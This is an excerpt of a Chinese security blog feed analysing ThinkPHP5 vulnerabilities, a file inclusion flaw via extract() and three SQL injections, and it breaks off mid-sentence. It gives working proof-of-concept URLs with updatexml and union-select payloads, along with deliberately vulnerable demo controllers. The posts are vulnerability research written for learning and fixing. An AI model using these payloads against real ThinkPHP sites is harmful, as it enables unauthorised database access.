class="string">&#x27;0&#x27;</span>;</span><br><span class="line">extract($_GET)；</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($auth==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;private!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;public!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>这种情况没有指定 flags，则被假定为 EXTR_OVERWRITE</strong></p><p>假设用户构造以下链接：<a href="http://www.a.com/test1.php?auth=1">http://www.a.com/test1.php?auth=1</a><br>界面上会打印出private！</p><p>安全的做法是确定register_globals=OFF后，在调用extract()时使用EXTR_SKIP保证已有变量不会被覆盖。<br>ps:<br>PHP extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.18</strong> 、<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.10</strong> </p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里以<code>ThinkPHP 5.0.18</code>  进行分析。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916184327.png" alt="image-20200916153529187"></p><p>在历史<code>Releases</code> 信息中，找到了 <code>5.0.19</code> 中，改进了 模板引擎的一处可能的安全隐患。</p><p><code>/library/think/template/driver/File.php</code> 中的 <code>File</code> 类中的<code>read</code> 方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185031.png" alt="image-20200916161144712"></p><ul><li>用户Get提交的数据都会通过<code>input</code> 方法获取数据，然后通过<code>filterValue</code> 方法进行过滤和强制类型转换。</li><li>在修改后的代码下断点，然后看方法调用和参数传递。如下图：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185043.png" alt="image-20200916163325855"></p><p>在<code>../application/index/index/controller/index.php</code> 中，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(request()-&gt;get());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(); <span class="comment">// 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用户输入的数据被<code>get</code>方法获取，然后调用了<code>input</code>方法和递归调用<code>filterValue</code> 方法，并且该方法还会继续调用<code>filterExp</code> 方法对特殊字符进行过滤，然后返回给<code>$data</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185108.png" alt="image-20200916165017001"></p><p>然后再调用<code>assign</code> 方法，返回处理后的数据。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185121.png" alt="image-20200916171205436"></p><p>因此用户的数据输入，经过<code>get</code>方法和<code>assign</code>方法后，返回的内容为<code>cacheFile=favico.ico</code> ，然后程序继续调用<code>fetch</code>方法进行处理。</p><blockquote><p>fetch方法用于加载模板输出。这里如果我们没有指定模板名称，其会使用默认的文件作为模板，模板路径类似 <strong>当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html</strong> ，如果默认路径模板不存在，程序就会报错。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185135.png" alt="image-20200916183120261"></p><p>跟进到 <strong>Template</strong> 类的 <strong>fetch</strong> 方法，可以发现可控变量 <strong>$vars</strong> 赋值给 <strong>$this-&gt;data</strong> 并最终传入 <strong>File</strong> 类的 <strong>read</strong> 方法。而 <strong>read</strong> 方法中在使用了 <strong>extract</strong> 函数后，直接包含了 <strong>$cacheFile</strong> 变量。这里就是漏洞发生的关键原因（可以通过 <strong>extract</strong> 函数，直接覆盖 <strong>$cacheFile</strong> 变量，因为 <strong>extract</strong> 函数中的参数 <strong>$vars</strong> 可以由用户控制）。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185154.png" alt="image-20200916184005912"></p><p>方法调用栈：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185205.png" alt="image-20200916184215051"></p><h2 id="利用总结"><a href="#利用总结" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185135.png" alt="image-20200916183120261"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185825.png" alt="7"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185031.png" alt="image-20200916161144712"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;ThinkPHP5文件包含漏洞&quot;&gt;&lt;a href=&quot;#ThinkPHP5文件包含漏洞&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP5文件包含漏洞&quot;&gt;&lt;/a&gt;ThinkPHP5文件包含漏洞&lt;/h2&gt;&lt;h2 id=&quot;</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="文件包含" scheme="https://hack-for.fun/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5漏洞学习-SQL注入</title>
    <link href="https://hack-for.fun/69fea760.html"/>
    <id>https://hack-for.fun/69fea760.html</id>
    <published>2020-09-13T05:40:27.000Z</published>
    <updated>2020-09-23T03:04:24.409Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>参考资料：<a href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a></p><p>环境准备：</p><ul><li>PHPStorm + MAMP PRO</li></ul><p>环境搭建可以看我前两篇文章。</p><ul><li>composer</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew install composer</span><br><span class="line">composer config -g repo.packagist composer https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;composer&#x2F;</span><br></pre></td></tr></table></figure><ul><li>获取复现代码</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.0.15 tpdemo</span><br></pre></td></tr></table></figure><p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.4.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.0.15&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>SQL 注入demo 环境</li></ul><p>修改<code>/application/index/controller/index.php</code> 的代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;insert([<span class="string">&#x27;username&#x27;</span> =&gt; $username]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>模拟这里存在一个用户传参并与数据库交互的场景。</p></blockquote><p>可能会存在，SQL 报错</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191229.png" alt="image-20200913135221064"></p><p>修改username 字段默认为<code>NULL</code>  即可解决问题。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191250.png" alt="image-20200913134825568"></p><h1 id="SQL注入一-insert"><a href="#SQL注入一-insert" class="headerlink" title="SQL注入一(insert)"></a>SQL注入一(insert)</h1><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public&#x2F;index&#x2F;index?username[0]&#x3D;inc&amp;username[1]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]&#x3D;1 </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191832.png" alt="image-20200913134332556"></p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.0.13&lt;=ThinkPHP&lt;=5.0.15</strong> 、 <strong>5.1.0&lt;=ThinkPHP&lt;=5.1.5</strong></p><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>本次漏洞存在于 <strong>Builder</strong> 类的 <strong>parseData</strong> 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生。</p><p>类型：<code>insert</code> 注入。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><blockquote><p>对于开源项目，在issue 或者 commit \ Releases 记录中，就能找到历史漏洞信息。这一点在CTF中经常用到，尤其是Node.js 的第三方依赖漏洞。</p></blockquote><p>从漏洞影响版本可以去找 已经修复后的版本，<a href="https://github.com/top-think/framework/releases/tag/v5.0.16">https://github.com/top-think/framework/releases/tag/v5.0.16</a></p><p>通过github 的<code>compare</code>功能，即可查看代码发生了哪些修改。</p><p><a href="https://github.com/top-think/framework/compare/v5.0.16...master">https://github.com/top-think/framework/compare/v5.0.16...master</a></p><p>在<code>/thinkphp/library/think/db/Connection.php</code> 的 314， 316 行下断点Debug，打payload。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191848.png" alt="image-20200913141903209"></p><p>INSERT INTO <code>users</code> (<code>username</code>) VALUES (updatexml(1,concat(0x7,user(),0x7e),1)+1) </p><p>同时成功攻击的Payload 所在的参数位于 <code>username[1]</code> 的 <code>value</code>  。</p><p>攻击Payload 经过ThinkPHP 的内置过滤后，进入<code>$this-&gt;builder</code> 的<code>Query</code> 类的<code>insert</code> 方法，执行其中的SQL语句，并在后面返回出了执行结果。因为Payload利用<code>updatexml()</code>来报错，因此必须开启<code>app_debug</code> 来开启SQL 报错信息。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192007.png" alt="image-20200913155142684"></p><p>(如上图debug 结果中Query.php），<code>$this-&gt;builder</code> 为 <code>think\db\builder\Mysql</code> 类，<code>Query</code> 的定义位于 <code>thinkphp/library/think/db/builder/Mysql.php</code> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192026.png" alt="image-20200913161424839"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192043.png" alt="image-20200913161552092"></p><p>在<code>/thinkphp/library/think/db/builder/Mysql.php</code> , <code>Mysql</code> 类继承于<code>Builder</code> 类，即上面的 <strong>$this-&gt;builder-&gt;insert()</strong> 最终调用的是 <strong>Builder</strong> 类的 <strong>insert</strong> 方法</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192059.png" alt="image-20200913162209236"></p><p>方法调用<code>parseData()</code>方法来分析并处理数据，跟进该方法。</p><p><code>/thinkphp/library/think/db/Builder.php</code> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913193005.png" alt="image-20200913163148214"></p><p>在<code>inc</code> 和 <code>dec</code> 的 情况下，将可控数据<code>$val[1]</code>通过<code>parseKey</code>方法处理后，进行拼接，并返回<code>$result</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192945.png" alt="image-20200913185951795"></p><p><code>parseKey</code>方法 不做任何处理，是直接返回值的一个方法。</p><blockquote><p>因此，带有恶意SQL 语句的Payload，被拼接且没任何字符串形式处理在Builder类的insert方法中，通过str_replace函数直接替换，返回sql，带入SQL语句中被执行，造成了SQL注入漏洞。</p></blockquote><p>在<code>thinkphp/library/think/Request.php</code> 中，有调用内置过滤（直接替换为空）方法，对参数<code>exp</code>进行过滤，在case <code>exp</code>的情况下，无法造成漏洞。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192928.png" alt="carbon"></p><p>问题：为什么不能将恶意Payload 用<code>username[2]</code> 来投递？</p><p>原因：</p><p>同样的办法，下断点，debug 可以看到。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192915.png" alt="image-20200913181025221"></p><p>回到之前的<code>parseDate</code> 方法，<code>username[2]</code>的值通过<code>floatval</code>函数处理</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192902.png" alt="image-20200913171023035"></p><p>payload 变为了<code>0</code> ，且 会存在SQL 错误。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192852.png" alt="image-20200913182241348"></p><h2 id="利用总结"><a href="#利用总结" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192749.png" alt="image-20200913185834897"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192803.png" alt="image-20200913151252661"></p><h1 id="SQL注入二-update"><a href="#SQL注入二-update" class="headerlink" title="SQL注入二(update)"></a>SQL注入二(update)</h1><p>复现代码获取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.1  tpdemo3</span><br></pre></td></tr></table></figure><p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.6.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.1.7&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>../config/app.php</code> 中，需要修改<code>app_trace</code> 为true， <code>app_debug</code> 默认开启了。</p><p>创建数据库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create database tpdemo;</span><br><span class="line">use tpdemo;</span><br><span class="line">create table users(</span><br><span class="line">id int primary key auto_increment,</span><br><span class="line">username varchar(50) not null</span><br><span class="line">);</span><br><span class="line">insert into users(id,username) values(1,&#39;testuser&#39;);</span><br></pre></td></tr></table></figure><p>这里也要设置username 字段 为<code>NULL</code> 才行</p><p>修改<code>/application/index/controller/index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;id&#x27;</span> =&gt; <span class="number">1</span>])-&gt;update([<span class="string">&#x27;username&#x27;</span> =&gt; $username]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index&#x2F;index?username[0]&#x3D;point&amp;username[1]&#x3D;1&amp;username[2]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]&#x3D;0</span><br></pre></td></tr></table></figure><p>很SQL 注入一非常类似。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203133.png" alt="image-20200914152750668"></p><h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p>漏洞影响版本： <strong>5.1.6&lt;=ThinkPHP&lt;=5.1.7</strong> (非最新的 <strong>5.1.8</strong> 版本也可利用)。</p><h2 id="漏洞概述-1"><a href="#漏洞概述-1" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>本次漏洞存在于 <strong>Mysql</strong> 类的 <strong>parseArrayData</strong> 方法中由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生</p><p>注入类型：<code>update</code> 注入</p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><blockquote><p>对于开源项目，在issue 或者 commit \ Releases 记录中，就能找到历史漏洞信息。这一点在CTF中经常用到，尤其是Node.js 的第三方依赖漏洞。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203118.png" alt="image-20200914161022479"></p><ul><li>下断点，debug。观察参数传递过程</li><li>监控MySQL</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203111.png" alt="image-20200914184917592"></p><hr><p>下断点，开启Debug，打Payload。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202218.png" alt="image-20200914173011583"></p><p><code>../thinkphp/library/think/db/Query.php</code> 中，Payload 传入Query 类的 <code>update</code>方法，跟进该方法，该方法调用了<code>Connection</code> 类的该方法为<code>update</code>方法，该方法又调用了 </p><p><code>$this-&gt;builder</code> 的<code>update</code> 方法，此处的<code>$this-&gt;builder</code> 为为<code>think\db\builder\Mysql</code> 类。<code>class Mysql extends Builder</code> ，该类继承于<code>Builder</code> 类。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202201.png" alt="image-20200914170732409"></p><p>在<code>Builder</code>类中的<code>update</code>方法，调用了<code>parseData</code>方法，（正如上图debug结果。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202036.png" alt="image-20200914184754350"></p><p>在该方法中的<code>swich</code>语句中，之前出现过漏洞，现在多了一条default 语句。而在新版本中被删除了。</p><p>跟进到<code>parseData</code> 方法，发现Payload 又被<code>parseArrayData</code>方法处理，继续跟进，</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202026.png" alt="image-20200914185836504"></p><p>在<code>../thinkphp/library/think/db/builder/Mysql.php</code> 中的 200 行返回result 的地方打断点，调试结果如下。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202011.png"></p><p>此处将可控变量经过拼接后被带入数据库进行查询。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201959.png" alt="image-20200914193548748"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseArrayData</span>(<span class="params">Query $query, $data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">list</span>($type, $value) = $data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (strtolower($type)) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;point&#x27;</span>:</span><br><span class="line">            $fun   = <span class="keyword">isset</span>($data[<span class="number">2</span>]) ? $data[<span class="number">2</span>] : <span class="string">&#x27;GeomFromText&#x27;</span>;</span><br><span class="line">            $point = <span class="keyword">isset</span>($data[<span class="number">3</span>]) ? $data[<span class="number">3</span>] : <span class="string">&#x27;POINT&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">                $value = implode(<span class="string">&#x27; &#x27;</span>, $value);</span><br><span class="line">            &#125;</span><br><span class="line">            $result = $fun . <span class="string">&#x27;(\&#x27;&#x27;</span> . $point . <span class="string">&#x27;(&#x27;</span> . $value . <span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $result = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result = $fun . <span class="string">&#x27;(\&#x27;&#x27;</span> . $point . <span class="string">&#x27;(&#x27;</span> . $value . <span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br></pre></td></tr></table></figure><p>三个变量均可控。形式为：<code>$a(&#39;$b($c)&#39;)</code> </p><blockquote><p>现在就是想办法如何闭合，然后进行注入攻击。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE &#96;users&#96;  SET &#96;username&#96; &#x3D; $a(&#39;$b($c)&#39;)  WHERE  &#96;id&#96; &#x3D; 1;</span><br></pre></td></tr></table></figure><p>即让<code>$fun</code> 为我们的恶意Payload 即可。然后闭合掉后面的部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7,user(),0x7e),1)^(&#39;0(1)&#39;)</span><br></pre></td></tr></table></figure><h2 id="利用总结-1"><a href="#利用总结-1" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201929.png" alt="carbon"></p><p>下图来自参考资料。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201900.png" alt="8"></p><h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>升级最新版，</p><p>官方直接删了<code>parseArrayDate</code> 函数。</p><blockquote><p>一点点感想，我感觉按照这个师傅的分析思路，是逆着payload 去分析的漏洞原因，我好想正面直接挖啊，菜死了。</p></blockquote><h1 id="SQL注入三-select"><a href="#SQL注入三-select" class="headerlink" title="SQL注入三(select)"></a>SQL注入三(select)</h1><p>新增参考资料：<a href="https://www.cnblogs.com/wangtanzhi/p/12732557.html">https://www.cnblogs.com/wangtanzhi/p/12732557.html</a></p><blockquote><p>学习就是要学习不同大佬的思路，然后转换为自己的思路。</p></blockquote><h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index&#x2F;?username&#x3D;)%20union%20select%20updatexml(1,concat(0x7,user(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105138.png" alt="image-20200914214213065"></p><p>sqlmap 也可以跑出结果。</p><h2 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h2><p>ThinkPHP5 全版本</p><h2 id="漏洞概述-2"><a href="#漏洞概述-2" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>本次漏洞存在于 <strong>Mysql</strong> 类的 <strong>parseWhereItem</strong> 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生。</p><h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><ul><li>MySQL 监控</li></ul><blockquote><p>监控不到，不知道为什么。配置也是正确的。</p></blockquote><p><code>/application/index/controller/index.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105308.png" alt="image-20200914220015121"></p><blockquote><p>然后用户输入的数据会原样进入框架的 SQL 查询方法中。首先程序先调用 Query 类的 where 方法，通过其 parseWhereExp 方法分析查询表达式，然后再返回并继续调用 select 方法准备开始构建 select 语句。（这个点得记住，框架的sql查询方法先进入 Query 类）</p></blockquote><hr><blockquote><p>程序默认调用 <strong>Request</strong> 类的 <strong>get</strong> 方法中会调用该类的 <strong>input</strong> 方法，但是该方法默认情况下并没有对数据进行很好的过滤，所以用户输入的数据会原样进入框架的 <strong>SQL</strong> 查询方法中。首先程序先调用 <strong>Query</strong> 类的 <strong>where</strong> 方法，通过其 <strong>parseWhereExp</strong> 方法分析查询表达式，然后再返回并继续调用 <strong>select</strong> 方法准备开始构建 <strong>select</strong> 语句。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105416.png" alt="image-20200914222945520"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105701.png" alt="image-20200914224146213"></p><p>此处调用<code>$this-&gt;builder</code>的<code>select</code>方法。而此处<code>$this-&gt;builder</code> 为<code>think/db/builder/Mysql</code> 类，继承于<code>Builder</code> 类。因此调用的是<code>Builder</code>类的<code>select</code> 方法</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105718.png" alt="image-20200914225616763"></p><p>在 <strong>select</strong> 方法中，程序会对 <strong>SQL</strong> 语句模板用变量填充，其中用来填充 <strong>%WHERE%</strong> 的变量中存在用户输入的数据。跟进这个 <strong>where</strong> 分析函数，会发现其会调用生成查询条件 <strong>SQL</strong> 语句的 <strong>buildWhere</strong> 函数。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105734.png" alt="image-20200914231827114"></p><p>此处<code>$where</code> 经过 <code>buildWhere</code> 方法处理后返回<code>$whereStr</code></p><p><code>parseWhereItem</code> 的 <code>where</code>  